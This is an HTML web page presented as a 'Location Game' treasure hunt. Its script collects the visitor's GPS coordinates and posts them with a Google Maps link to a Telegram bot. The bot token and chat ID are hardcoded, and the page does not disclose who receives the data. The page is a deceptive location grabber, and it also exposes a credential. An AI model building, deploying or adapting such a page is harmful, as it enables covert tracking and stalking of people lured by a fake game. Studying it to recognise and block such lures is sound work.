<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-UTF" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Location Game</title>
  <link rel="manifest" href="manifest.json" />
  <meta name="theme-color" content="#28a745" />
  <link rel="icon" type="image/png" href="https://iili.io/FWysYHx.md.png" />

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(to bottom right, #0f0f0f, #1c1c1c);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
    }
    p {
      margin: 10px 0 20px;
      font-size: 1.1em;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #218838;
    }
    .message {
      margin-top: 20px;
      font-size: 1.2em;
      color: #ffdf00;
    }
  </style>
</head>
<body>
  <h1>üìç Location Game</h1>
  <p>Allow location to start your hunt!</p>
  <button onclick="getLocation()">Start the Hunt</button>
  <div class="message" id="gameMessage"></div>

  <script>
    function getLocation() {
      document.getElementById('gameMessage').textContent = "Requesting location...";
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        document.getElementById('gameMessage').textContent = "Geolocation is not supported by this browser.";
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const msg = `üìç New Player Location:\nLatitude: ${lat}\nLongitude: ${lon}\n\nüîó [Open in Google Maps](${mapsLink})`;

      const token = "7592762647:AAGk_PjuVSCAvjsafvxFWxxKTIipRtzv64M";
      const chatId = "5099451464";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg,
          parse_mode: "Markdown"
        })
      })
      .then(() => {
        document.getElementById('gameMessage').textContent = "‚úÖ Location sent!";
      })
      .catch(() => {
        document.getElementById('gameMessage').textContent = "‚ùå Failed to send location.";
      });
    }

    function showError(error) {
      let msg = "";
      switch(error.code) {
        case error.PERMISSION_DENIED:
          msg = "You denied the location request.";
          break;
        case error.POSITION_UNAVAILABLE:
          msg = "Location info unavailable.";
          break;
        case error.TIMEOUT:
          msg = "Location request timed out.";
          break;
        default:
          msg = "Unknown error.";
      }
      document.getElementById('gameMessage').textContent = msg;
    }

    // Register service worker
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('service-worker.js')
          .then(reg => console.log('‚úÖ Service Worker Registered'))
          .catch(err => console.log('‚ùå Service Worker Failed:', err));
      });
    }
  </script>
</body>
</html>
